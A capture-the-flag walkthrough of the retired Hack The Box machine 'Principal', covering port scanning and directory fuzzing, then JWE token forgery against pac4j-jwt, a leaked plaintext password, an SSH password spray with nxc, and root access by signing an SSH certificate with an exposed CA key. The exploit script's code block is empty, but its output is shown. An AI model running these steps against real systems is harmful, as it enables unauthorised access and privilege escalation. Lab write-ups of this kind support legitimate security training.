# Principal

> Retired Hack The Box machine. Public copy with flags and transient challenge tokens removed. Authorized lab use only.

Step 1: Nmap

```
Command: nmap -A --top-port 10000 10.129.244.220  --min-rate 1000
```

```
Output:

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 22:09 -0400
Nmap scan report for 10.129.244.220
Host is up (0.045s latency).
Not shown: 8378 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 20 Mar 2026 02:10:03 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-20T02:10:03.999+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Fri, 20 Mar 2026 02:10:03 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 20 Mar 2026 02:10:03 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Fri, 20 Mar 2026 02:10:03 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 20 Mar 2026 02:10:04 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=3/19%Time=69BCAC73%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Fri,\x2020\x20
SF:Mar\x202026\x2002:10:03\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20
SF:pac4j-jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\n
SF:Content-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK
SF:\r\nDate:\x20Fri,\x2020\x20Mar\x202026\x2002:10:03\x20GMT\r\nServer:\x2
SF:0Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTI
SF:ONS\r\nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,220,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:
SF:\x20Fri,\x2020\x20Mar\x202026\x2002:10:03\x20GMT\r\nCache-Control:\x20m
SF:ust-revalidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20ht
SF:tp-equiv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>
SF:\n<title>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<
SF:h2>HTTP\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>UR
SF:I:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>
SF:\n<tr><th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</
SF:body>\n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20
SF:Found\r\nDate:\x20Fri,\x2020\x20Mar\x202026\x2002:10:03\x20GMT\r\nServe
SF:r:\x20Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20
SF:must-revalidate,no-cache,no-store\r\nContent-Type:\x20application/json\
SF:r\n\r\n{\"timestamp\":\"2026-03-20T02:10:03\.999\+00:00\",\"status\":40
SF:4,\"error\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt
SF:%2ebak\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x
SF:20Fri,\x2020\x20Mar\x202026\x2002:10:04\x20GMT\r\nCache-Control:\x20mus
SF:t-revalidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http
SF:-equiv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n
SF:<title>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head
SF:>\n<body>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5
SF:</h2>\n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STA
SF:TUS:</th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20charact
SF:er\x20CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   44.28 ms 10.10.14.1
2   44.36 ms 10.129.244.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.97 seconds

```


Step 2: Fuzzing

```
Command: ffuf -u http://10.129.244.220:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```
Output:

login
error
dashboard
```


Step 3: Browse to /dashboard

```
It only show a second of web interface, so i decided to use burpsuite to intercept /dashboard, and view page source I see an interesting parameter: /static/js/app.js
```

```
Output:

/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

// Role constants - must match server-side role definitions
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};

// Token management
class TokenManager {
    static getToken() {
        return sessionStorage.getItem('auth_token');
    }

    static setToken(token) {
        sessionStorage.setItem('auth_token', token);
    }

    static clearToken() {
        sessionStorage.removeItem('auth_token');
    }

    static isAuthenticated() {
        return !!this.getToken();
    }

    static getAuthHeaders() {
        const token = this.getToken();
        return token ? { 'Authorization': `Bearer ${token}` } : {};
    }
}

// API client
class ApiClient {
    static async request(endpoint, options = {}) {
        const defaults = {
            headers: {
                'Content-Type': 'application/json',
                ...TokenManager.getAuthHeaders()
            }
        };

        const config = { ...defaults, ...options, headers: { ...defaults.headers, ...options.headers } };

        try {
            const response = await fetch(`${API_BASE}${endpoint}`, config);

            if (response.status === 401) {
                TokenManager.clearToken();
                if (window.location.pathname !== '/login') {
                    window.location.href = '/login';
                }
                throw new Error('Authentication required');
            }

            return response;
        } catch (error) {
            if (error.message === 'Authentication required') throw error;
            throw new Error('Network error. Please try again.');
        }
    }

    static async get(endpoint) {
        return this.request(endpoint);
    }

    static async post(endpoint, data) {
        return this.request(endpoint, {
            method: 'POST',
            body: JSON.stringify(data)
        });
    }

    /**
     * Fetch JWKS for token verification
     * Used by client-side token inspection utilities
     */
    static async fetchJWKS() {
        const response = await fetch(JWKS_ENDPOINT);
        return response.json();
    }
}

/**
 * Render dashboard navigation based on user role.
 * Admin users (ROLE_ADMIN) get access to user management and system settings.
 * Managers (ROLE_MANAGER) get read-only access to team dashboards.
 * Regular users (ROLE_USER) only see their own deployment panel.
 */
function renderNavigation(role) {
    const navItems = [
        { label: 'Dashboard', endpoint: DASHBOARD_ENDPOINT, roles: [ROLES.ADMIN, ROLES.MANAGER, ROLES.USER] },
        { label: 'Users', endpoint: USERS_ENDPOINT, roles: [ROLES.ADMIN] },
        { label: 'Settings', endpoint: SETTINGS_ENDPOINT, roles: [ROLES.ADMIN] },
    ];

    return navItems.filter(item => item.roles.includes(role));
}

// Login form handler
function initLoginForm() {
    const form = document.getElementById('loginForm');
    if (!form) return;

    // Redirect if already authenticated
    if (TokenManager.isAuthenticated()) {
        window.location.href = '/dashboard';
        return;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        const errorEl = document.getElementById('errorMessage');
        const btnText = document.querySelector('.btn-text');
        const btnLoading = document.querySelector('.btn-loading');
        const loginBtn = document.getElementById('loginBtn');

        // Reset error
        errorEl.style.display = 'none';

        if (!username || !password) {
            showError('Please enter both username and password.');
            return;
        }

        // Show loading state
        loginBtn.disabled = true;
        btnText.style.display = 'none';
        btnLoading.style.display = 'flex';

        try {
            const response = await ApiClient.post(AUTH_ENDPOINT, { username, password });
            const data = await response.json();

            if (response.ok) {
                TokenManager.setToken(data.token);
                // Token is JWE encrypted - decryption handled server-side
                // JWKS at /api/auth/jwks provides the encryption public key
                window.location.href = '/dashboard';
            } else {
                showError(data.message || 'Authentication failed. Please check your credentials.');
            }
        } catch (error) {
            showError(error.message || 'An error occurred. Please try again.');
        } finally {
            loginBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
        }
    });
}

function showError(message) {
    const errorEl = document.getElementById('errorMessage');
    errorEl.textContent = message;
    errorEl.style.display = 'flex';
}

function togglePassword() {
    const input = document.getElementById('password');
    input.type = input.type === 'password' ? 'text' : 'password';
}

// Dashboard page handler
async function initDashboard() {
    const container = document.getElementById('dashboardApp');
    if (!container) return;

    if (!TokenManager.isAuthenticated()) {
        window.location.href = '/login';
        return;
    }

    try {
        const resp = await ApiClient.get(DASHBOARD_ENDPOINT);
        if (!resp.ok) throw new Error('Failed to load dashboard');
        const data = await resp.json();

        const user = data.user;
        const stats = data.stats;

        document.getElementById('welcomeUser').textContent = user.username;
        document.getElementById('userRole').textContent = user.role;

        // Stats cards
        document.getElementById('statUsers').textContent = stats.totalUsers;
        document.getElementById('statDeploys').textContent = stats.activeDeployments;
        document.getElementById('statHealth').textContent = stats.systemHealth;
        document.getElementById('statUptime').textContent = stats.uptimePercent + '%';

        // Build navigation based on role
        const nav = renderNavigation(user.role);
        const navEl = document.getElementById('sideNav');
        navEl.innerHTML = nav.map(item =>
            `<a href="#" class="nav-item" data-endpoint="${item.endpoint}">${item.label}</a>`
        ).join('');

        navEl.querySelectorAll('.nav-item').forEach(el => {
            el.addEventListener('click', async (e) => {
                e.preventDefault();
                navEl.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                el.classList.add('active');
                await loadPanel(el.dataset.endpoint);
            });
        });

        // Mark first nav active
        const firstNav = navEl.querySelector('.nav-item');
        if (firstNav) firstNav.classList.add('active');

        // Activity log
        const logBody = document.getElementById('activityLog');
        logBody.innerHTML = data.recentActivity.map(a =>
            `<tr><td>${a.timestamp}</td><td><span class="badge badge-${a.action.includes('FAIL') ? 'danger' : 'info'}">${a.action}</span></td><td>${a.username}</td><td>${a.details}</td></tr>`
        ).join('');

        // Announcements
        const announcementsEl = document.getElementById('announcements');
        announcementsEl.innerHTML = data.announcements.map(a =>
            `<div class="announcement ${a.severity}"><strong>${a.title}</strong><p>${a.message}</p><small>${a.date}</small></div>`
        ).join('');

    } catch (err) {
        console.error('Dashboard load error:', err);
    }
}

async function loadPanel(endpoint) {
    const panel = document.getElementById('contentPanel');
    try {
        const resp = await ApiClient.get(endpoint);
        const data = await resp.json();

        if (resp.status === 403) {
            panel.innerHTML = `<div class="panel-error"><h3>Access Denied</h3><p>${data.message}</p></div>`;
            return;
        }

        if (endpoint === USERS_ENDPOINT) {
            panel.innerHTML = `<h3>User Management</h3><table class="data-table"><thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Department</th><th>Status</th><th>Notes</th></tr></thead><tbody>${
                data.users.map(u => `<tr><td>${u.username}</td><td>${u.displayName}</td><td><span class="badge">${u.role}</span></td><td>${u.department}</td><td>${u.active ? '<span class="badge badge-success">Active</span>' : '<span class="badge badge-danger">Disabled</span>'}</td><td>${u.note}</td></tr>`).join('')
            }</tbody></table>`;
        } else if (endpoint === SETTINGS_ENDPOINT) {
            panel.innerHTML = `<h3>System Settings</h3>
                <div class="settings-grid">
                    <div class="settings-section"><h4>System</h4><dl>${Object.entries(data.system).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Security</h4><dl>${Object.entries(data.security).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Infrastructure</h4><dl>${Object.entries(data.infrastructure).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                </div>`;
        } else {
            panel.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
        }
    } catch (err) {
        panel.innerHTML = `<div class="panel-error">Error loading data</div>`;
    }
}

function logout() {
    TokenManager.clearToken();
    window.location.href = '/login';
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initLoginForm();
    initDashboard();

    // Prefetch JWKS for token handling
    if (window.location.pathname === '/login') {
        ApiClient.fetchJWKS().then(jwks => {
            // Cache JWKS for client-side token operations
            window.__jwks = jwks;
        }).catch(() => {
            // JWKS fetch is non-critical for login flow
        });
    }
});
```


Step 4: Browse to search for CVE

```
Interesting since nmap:
```

And got this github repo that related to CVE

```
https://github.com/kernelzeroday/CVE-2026-29000.git
```


Step 5: I use claude.ai to build me an exploit script

Here is the script:

```

```


And here is the Output:

```
[*] Fetching JWKS...
[*] JWKS: {
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }
  ]
}
/home/kali/HTB/Principal/exploit.py:21: DeprecationWarning: 
  print(f"[*] Using key id: {key.key_id}")
[*] Using key id: enc-key-1
[*] Inner JWT: <REDACTED_CHALLENGE_TOKEN>

[*] Forged JWE token:
<REDACTED_CHALLENGE_TOKEN>

[*] /api/dashboard -> 200
{
  "user": {
    "username": "admin",
    "role": "ROLE_ADMIN"
  },
  "announcements": [
    {
      "severity": "info",
      "date": "2025-12-30",
      "message": "Scheduled maintenance on Jan 15 02:00-04:00 UTC. Deploy pipelines will be paused.",
      "title": "Maintenance Window"
    },
    {
      "severity": "warning",
      "date": "2025-12-15",
      "message": "SSH CA keys have been rotated. All deploy certificates issued before Dec 1 are revoked.",
      "title": "New SSH CA Rotation"
    }
  ],
  "stats": {
    "uptimePercent": 99.7,
    "lastDeployment": "2025-12-28T14:32:00Z",
    "systemHealth": "operational",
    "totalUsers": 8,
    "pendingAlerts": 2,
    "activeDeployments": 3
  },
  "recentActivity": [
    {
      "timestamp": "2026-03-20T02:15:46.368041",
      "acti

[*] /api/users -> 200
{
  "users": [
    {
      "id": 1,
      "department": "IT Security",
      "displayName": "Sarah Chen",
      "email": "s.chen@principal-corp.local",
      "username": "admin",
      "note": "",
      "role": "ROLE_ADMIN",
      "active": true,
      "lastLogin": "2025-12-28T09:15:00Z"
    },
    {
      "id": 2,
      "department": "DevOps",
      "displayName": "Deploy Service",
      "email": "svc-deploy@principal-corp.local",
      "username": "svc-deploy",
      "note": "Service account for automated deployments via SSH certificate auth.",
      "role": "deployer",
      "active": true,
      "lastLogin": "2025-12-28T14:32:00Z"
    },
    {
      "id": 3,
      "department": "Engineering",
      "displayName": "James Thompson",
      "email": "j.thompson@principal-corp.local",
     

[*] /api/settings -> 200
{
  "infrastructure": {
    "database": "H2 (embedded)",
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
  },
  "system": {
    "version": "1.2.0",
    "applicationName": "Principal Internal Platform",
    "javaVersion": "21.0.10",
    "serverType": "Jetty 12.x (Embedded)",
    "environment": "production"
  },
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
  "integrations": [
    {
      "name": "GitLab CI/CD",
      "stat

```

Interesting Output:

```
Found many users.txt

admin
svc-deploy
James Thompson
Sarah Chen

Found Password:
D3pl0y_$$H_Now42!

And found interesting path:
[*] /api/settings -> 200
{
  "infrastructure": {
    "database": "H2 (embedded)",
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
  }
```

Step 6: Test which user has permission with ssh with the password found

```
Command: nxc ssh 10.129.244.220 -u users.txt -p 'D3pl0y_$$H_Now42!'
```

```
Output:

SSH         10.129.244.220  22     10.129.244.220   [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH         10.129.244.220  22     10.129.244.220   [-] admin:D3pl0y_$$H_Now42!
SSH         10.129.244.220  22     10.129.244.220   [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access
```


Step 7: Login to that user and found the user flag

```
Command: ssh svc-deploy@10.129.244.220
```


```
Output:

svc-deploy@principal:~$ ls
user.txt
svc-deploy@principal:~$ cat user.txt 
[user flag removed]
```


Step 8: Privilege to root

```
Step 1: generate a keypair
Command: ssh-keygen -t rsa -b 4096 -f /tmp/htb_key -N ""

Step 2: Sign it as root with the CA
Command: ssh-keygen -s /opt/principal/ssh/ca -I "root_cert" -n root -V +1h /tmp/htb_key.pub

Step3: SSH in as root using the signed cert
Command: ssh -i /tmp/htb_key -i /tmp/htb_key-cert.pub root@localhost
```

Get root flag:

```
root@principal:~# ls
root.txt
root@principal:~# cat root.txt 
[root flag removed]
root@principal:~# 

```
